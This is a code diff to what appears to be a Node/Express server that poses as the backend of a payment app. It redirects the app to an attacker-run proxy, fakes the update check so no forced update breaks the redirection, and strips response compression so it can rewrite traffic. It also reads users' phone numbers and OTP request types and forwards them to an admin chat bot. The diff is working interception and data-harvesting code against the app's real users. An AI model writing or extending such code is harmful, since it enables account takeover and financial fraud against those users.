@@ -419,16 +419,28 @@ async function trackUser(data, userId, info, phone) {
 // ── CRITICAL STARTUP ROUTES — must be FIRST before any other middleware ──
 // These respond instantly so the APK never gets stuck on splash screen.
 // domainPool: tells APK which server to use → returns our proxy URL
-// checkUpdate: prevents force-update dialog (only needUpdate="1" triggers it)
+// checkUpdate: prevents force-update dialog (only needUpdate="1" forces update)
 app.all('/appAuth/domainPool', (req, res) => {
   const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
+  // Must return plain string URL in body — exactly like real beepaycommon.com server
   res.json({ status: '200', timestamp: ts, message: 'Success', body: 'https://ixcv.vercel.app' });
 });
 
 app.all('/appAuth/checkUpdate', (req, res) => {
   const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
-  // needUpdate "0" = no update; isUpdateApp() only triggers for "1", so "0" is safe
-  res.json({ status: '200', timestamp: ts, message: 'Success', body: { needUpdate: '0', version: '2.1.1', versionCode: '211', updateContent: '', link: '', md5: '' } });
+  // needUpdate "2" = optional update (same as real server), never "1" which forces update
+  res.json({
+    status: '200',
+    timestamp: ts,
+    message: 'Success',
+    body: {
+      version: '2.1.1',
+      updateContent: '\u7248\u67092.1.1,\u4fee\u590d\u4e86\u4e00\u4e9bbug\uff0c\u4f7f\u5e94\u7528\u66f4\u7a33\u5b9a\u6d41\u7545\uff0c\u63d0\u5347\u4e86\u7528\u6237\u4f53\u9a8c\uff0c\u611f\u8c22\u60a8\u7684\u4f7f\u7528',
+      link: '',
+      md5: '',
+      needUpdate: '2'
+    }
+  });
 });
 
 // ── Request body parsing ──────────────────────────────────────────
@@ -604,7 +616,9 @@ async function proxyFetch(req) {
   for (const [k, v] of Object.entries(req.headers || {})) {
     const kl = k.toLowerCase();
     if (kl === 'host') { headers['host'] = 'app-api.beepaypro.com'; continue; }
-    if (kl === 'content-length' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+    // Strip accept-encoding so beepaypro.com returns plain JSON (not gzip).
+    // If we forward gzip, we get compressed bytes we can't parse/modify.
+    if (kl === 'content-length' || kl === 'connection' || kl === 'accept-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     headers[k] = v;
   }
   const opts = { method: req.method, headers };
@@ -1526,8 +1540,8 @@ app.all('/appAuth/sendOtp', async (req, res) => {
   try {
     const body = req.parsedBody || {};
     const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const phone = body.mobile || body.phone || body.loginName || '';
-    const otpType = body.type || body.otpType || '';
+    const phone = body.memberPhone || body.mobile || body.phone || body.loginName || '';
+    const otpType = body.sceneType || body.sendType || body.type || body.otpType || '';
     sendJson(res, respHeaders, jsonResp, respBody);
     if (data.adminChatId && bot) {
       const success = parseInt(jsonResp?.status) === 200;
